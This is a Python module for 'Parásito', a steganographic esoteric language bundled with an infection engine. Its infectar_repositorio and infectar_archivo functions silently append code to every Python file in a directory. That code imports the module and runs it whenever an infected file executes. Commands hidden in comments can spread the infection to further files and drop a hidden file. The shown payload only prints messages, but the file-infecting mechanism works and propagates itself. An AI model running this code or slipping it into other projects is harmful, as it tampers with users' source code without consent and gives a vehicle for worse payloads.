import tokenize
import os
import sys

# Ensure UTF-8 stdout on Windows if possible
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass

"""
🦠 Parásito: El Lenguaje de Programación Esteganográfico & Motor de Infección.

Capa 1: Código Anfitrión (Python normal execution)
Capa 2: Código Parásito (Comentarios -> Palabras en posiciones IMPARES)
Capa 3: Esteganografía Fantasma (Comentarios -> Primera letra de palabras PARES)
"""

# --- DICCIONARIO AMPLIADO DE COMANDOS Y SINÓNIMOS ---
DICCIONARIO_COMANDOS = {
    # Memoria y acumulador
    "limpiar": "limpiar", "resetear": "limpiar", "borrar": "limpiar",
    "guardar": "guardar", "almacenar": "guardar", "setear": "guardar", "asignar": "guardar",
    "archivar": "archivar", "registrar": "archivar", "guardar_var": "archivar",
    "recordar": "recordar", "cargar": "recordar", "recuperar": "recordar",

    # Aritmética y Cadenas
    "sumar": "sumar", "adicionar": "sumar", "incrementar": "sumar",
    "restar": "restar", "sustraer": "restar", "decrementar": "restar",
    "multiplicar": "multiplicar", "escalar": "multiplicar",
    "dividir": "dividir", "partir": "dividir",
    "unir": "unir", "concatenar": "unir", "anexar": "unir",

    # Control de flujo
    "destino": "destino", "etiqueta": "destino", "marca": "destino", "nodo": "destino",
    "saltar": "saltar", "ir": "saltar", "brincar": "saltar",
    "revisar": "revisar", "evaluar": "revisar", "comprobar": "revisar", "validar": "revisar",

    # I/O y Salida
    "mostrar": "mostrar", "imprimir": "mostrar", "expresar": "mostrar", "revelar": "mostrar",
    "espacio": "espacio", "blank": "espacio",
    "salto": "salto", "linea": "salto",

    # Capacidades de Infección y Mensajes Secretos
    "secreto": "secreto", "ocultar": "secreto",
    "infectar": "infectar", "propagar": "infectar", "infiltrar": "infectar"
}

# --- DICCIONARIO DE PALABRAS PARES (PEGAMENTOS CON SENTIDO POR LETRA) ---
DICCIONARIO_PEGAMENTOS = {
    'A': ["acceso", "archivo", "almacenamiento", "analisis", "auditoria"],
    'B': ["bloque", "buffer", "bus", "base", "bucle"],
    'C': ["codigo", "conexion", "control", "cliente", "consulta"],
    'D': ["datos", "direccion", "depuracion", "disco", "demonio"],
    'E': ["entrada", "estructura", "ejecucion", "evento", "estado"],
    'F': ["funcion", "flujo", "fichero", "formato", "filtro"],
    'G': ["gestion", "garantia", "generacion", "grupo", "gestor"],
    'H': ["hilo", "historial", "herramienta", "huella", "hardware"],
    'I': ["interfaz", "instruccion", "informe", "indice", "inicio"],
    'J': ["jerarquia", "jornada", "junta"],
    'K': ["kernel"],
    'L': ["libreria", "logica", "lectura", "llamada", "linea"],
    'M': ["memoria", "modulo", "mensaje", "matriz", "marco"],
    'N': ["nodo", "nivel", "nucleo", "norma", "nota"],
    'O': ["operacion", "objeto", "orden", "origen", "optimizacion"],
    'P': ["proceso", "paquete", "puerto", "parametro", "pila"],
    'Q': ["quorum", "quiebre"],
    'R': ["registro", "red", "respuesta", "rutina", "ruta"],
    'S': ["sistema", "servidor", "salida", "sesion", "socket"],
    'T': ["trama", "tabla", "tipo", "traza", "tarea"],
    'U': ["usuario", "unidad", "ubicacion", "utilidad"],
    'V': ["variable", "valor", "ventana", "verificacion", "vector"],
    'W': ["web"],
    'X': ["xml"],
    'Y': ["yarda"],
    'Z': ["zona"]
}

def limpiar_palabra(palabra):
    """Limpia puntuación y espacios de una palabra."""
    return palabra.lower().strip(' ,.!?:;"\'()[]{}')

def desinfectar_raw(palabra):
    """Obtiene el texto limpio preservando mayúsculas/minúsculas originales si es un valor literal."""
    return palabra.strip(' ,.!?:;"\'()[]{}')


def crear_comentario_esteganografico(palabras_impares, mensaje_fantasma):
    """
    Construye una frase comentada técnicamente coherente combinando:
    - Palabras IMPARES (código ejecutable de Parásito)
    - Palabras PARES (que inician con las letras exactas de mensaje_fantasma)
    """
    mensaje_clean = [c.upper() for c in mensaje_fantasma if c.isalnum()]
    linea = []
    idx_fantasma = 0
    
    for i, cmd in enumerate(palabras_impares):
        linea.append(cmd)
        
        # Seleccionar palabra par coherente que comience con la letra deseada
        if idx_fantasma < len(mensaje_clean):
            char_target = mensaje_clean[idx_fantasma]
            idx_fantasma += 1
            opciones = DICCIONARIO_PEGAMENTOS.get(char_target, ["sistema"])
            palabra_par = opciones[i % len(opciones)]
        else:
            # Si se acaban las letras del mensaje secreto, usar pegamentos neutros que formen palabras reales
            opciones = DICCIONARIO_PEGAMENTOS['S']
            palabra_par = opciones[i % len(opciones)]
            
        linea.append(palabra_par)
        
    return " ".join(linea)


def embed_secret_message(ruta_destino, mensaje):
    """Escribe un archivo de mensaje secreto oculto en el directorio destino."""
    dir_path = os.path.dirname(os.path.abspath(ruta_destino))
    secret_path = os.path.join(dir_path, ".parasito_secret.txt")
    try:
        with open(secret_path, "w", encoding="utf-8") as f:
            f.write(mensaje + "\n")
        print(f"[SECRETO] Mensaje secreto infiltrado en: {secret_path}")
    except Exception as e:
        print(f"[ERROR] Error al guardar mensaje secreto: {e}")


def infectar_archivo(ruta_target, mensaje_fantasma="INFILTRADO", programa_parasito=None):
    """
    Inyecta el parásito dentro de un archivo Python sin alterar su funcionalidad original.
    """
    if not os.path.exists(ruta_target):
        print(f"[ERROR] Archivo no encontrado: {ruta_target}")
        return False

    if programa_parasito is None:
        programa_parasito = ["limpiar", "guardar", "PARASITO_ACTIVO", "mostrar", "salto", "secreto", "CONSOLA_HACKEADA"]

    comentario_parasito = crear_comentario_esteganografico(programa_parasito, mensaje_fantasma)

    with open(ruta_target, "r", encoding="utf-8") as f:
        contenido = f.read()

    # Si ya está infectado, no volvemos a infectar
    if "import parasito" in contenido and "parasito.despertar" in contenido:
        print(f"[INFO] El archivo {os.path.basename(ruta_target)} ya esta infectado.")
        return False

    parasito_dir = os.path.dirname(os.path.abspath(__file__)).replace("\\", "/")
    
    infeccion_code = (
        f"\n# {comentario_parasito}\n"
        f"import sys, os\n"
        f"if r'{parasito_dir}' not in sys.path: sys.path.insert(0, r'{parasito_dir}')\n"
        f"import parasito\n"
        f"parasito.despertar(__file__)\n"
    )
    
    with open(ruta_target, "a", encoding="utf-8") as f:
        f.write(infeccion_code)

    print(f"[PARASITO] Archivo infectado con exito: {os.path.basename(ruta_target)}")
    return True


def infectar_repositorio(directorio_repo, mensaje_fantasma="INFILTRADO", programa_parasito=None):
    """
    Escanea un directorio/repositorio e infecta todos los archivos .py encontrados.
    """
    print(f"\n[PARASITO] INICIANDO INFECCION DE REPOSITORIO EN: {directorio_repo}")
    count = 0
    for root, _, files in os.walk(directorio_repo):
        for file in files:
            if file.endswith(".py") and not file.startswith("parasito") and not file.startswith("prueba"):
                ruta_completa = os.path.join(root, file)
                if infectar_archivo(ruta_completa, mensaje_fantasma, programa_parasito):
                    count += 1
    print(f"[PARASITO] Infeccion completada. {count} archivos alterados.\n")


def despertar(ruta_archivo):
    """
    Ejecuta la interpretación esteganográfica del lenguaje Parásito leyendo los comentarios
    del archivo anfitrión dado.
    """
    comentarios = []
    
    # Extraer comentarios utilizando tokenize
    try:
        with open(ruta_archivo, 'rb') as f:
            tokens = tokenize.tokenize(f.readline)
            for tok in tokens:
                if tok.type == tokenize.COMMENT:
                    comentarios.append(tok.string.lstrip('#').strip())
    except Exception as e:
        print(f"[ERROR] Error al leer comentarios de {ruta_archivo}: {e}")
        return

    texto_unido = " ".join(comentarios)
    palabras = texto_unido.split()
    
    if not palabras:
        print("\n[PARASITO]: No se encontraron comentarios en el archivo anfitrión.")
        return

    # REGLA PARÁSITO: Posiciones impares (0, 2, 4...)
    impares = palabras[::2] 
    pares = palabras[1::2]

    # --- FASE 1: REGISTRO DE ETIQUETAS (DESTINOS) ---
    etiquetas = {}
    for idx in range(len(impares)):
        cmd_raw = limpiar_palabra(impares[idx])
        cmd = DICCIONARIO_COMANDOS.get(cmd_raw, cmd_raw)
        if cmd == "destino":
            if idx + 1 < len(impares):
                etiquetas[limpiar_palabra(impares[idx+1])] = idx + 2 

    memoria = {}
    acumulador = ""
    resultado = ""
    i = 0
    
    def obtener_valor(idx):
        if idx >= len(impares): return ""
        raw_val = desinfectar_raw(impares[idx])
        clave = limpiar_palabra(impares[idx])
        return memoria.get(clave, raw_val)
    
    # --- FASE 2: EJECUCIÓN DEL PARÁSITO ---
    while i < len(impares):
        token_raw = limpiar_palabra(impares[i])
        cmd = DICCIONARIO_COMANDOS.get(token_raw, token_raw)
        
        if cmd == "guardar":
            i += 1
            if i < len(impares):
                acumulador = desinfectar_raw(impares[i])
        elif cmd == "archivar":
            i += 1
            if i < len(impares):
                memoria[limpiar_palabra(impares[i])] = acumulador
        elif cmd == "recordar":
            i += 1
            if i < len(impares):
                acumulador = memoria.get(limpiar_palabra(impares[i]), "")
        elif cmd in ("sumar", "restar", "multiplicar", "dividir"):
            i += 1
            if i < len(impares):
                val = obtener_valor(i)
                try:
                    base = float(acumulador) if acumulador != "" else 0.0
                    num = float(val)
                    if cmd == "sumar": nuevo_val = base + num
                    elif cmd == "restar": nuevo_val = base - num
                    elif cmd == "multiplicar": nuevo_val = base * num
                    elif cmd == "dividir": nuevo_val = base / num if num != 0 else base
                    
                    acumulador = str(int(nuevo_val)) if nuevo_val.is_integer() else str(nuevo_val)
                except ValueError:
                    pass
        elif cmd == "unir":
            i += 1
            if i < len(impares):
                acumulador = str(acumulador) + str(obtener_valor(i))
        elif cmd == "saltar":
            i += 1
            if i < len(impares):
                dest = limpiar_palabra(impares[i])
                if dest in etiquetas:
                    i = etiquetas[dest] - 1 
        elif cmd == "revisar":
            i += 1
            if i < len(impares):
                try:
                    if float(acumulador) > 0:
                        dest = limpiar_palabra(impares[i])
                        if dest in etiquetas:
                            i = etiquetas[dest] - 1
                except ValueError:
                    pass
        elif cmd == "mostrar":
            resultado += str(acumulador)
        elif cmd == "espacio":
            resultado += " "
        elif cmd == "salto":
            resultado += "\n"
        elif cmd == "limpiar":
            resultado = ""
            acumulador = ""
            memoria = {}
        elif cmd == "secreto":
            i += 1
            if i < len(impares):
                embed_secret_message(ruta_archivo, desinfectar_raw(impares[i]))
        elif cmd == "infectar":
            i += 1
            if i < len(impares):
                target = desinfectar_raw(impares[i])
                infectar_archivo(target)
        elif cmd == "destino": 
            i += 1 # Ignorar el nombre de la etiqueta al pasar sobre ella
            
        i += 1 
        
    print("\n========================================")
    print("  [PARASITO] EJECUCION DEL ESOLANG")
    print("========================================")
    print(resultado if resultado else "(El parasito guardo silencio)")
    print("----------------------------------------")

    # --- FASE 3: ESTEGANOGRAFÍA FANTASMA (Acróstico Par) ---
    acrostico = ""
    for p in pares:
        letra = desinfectar_raw(p)
        if letra:
            acrostico += letra[0].upper()
            
    print("\n[FANTASMA] ESCANER DE FANTASMAS (Acrostico Par)")
    print(f"Mensaje acrostico oculto: {acrostico}")
    print("========================================\n")

if __name__ == "__main__":
    print("Modulo Parasito cargado correctamente.")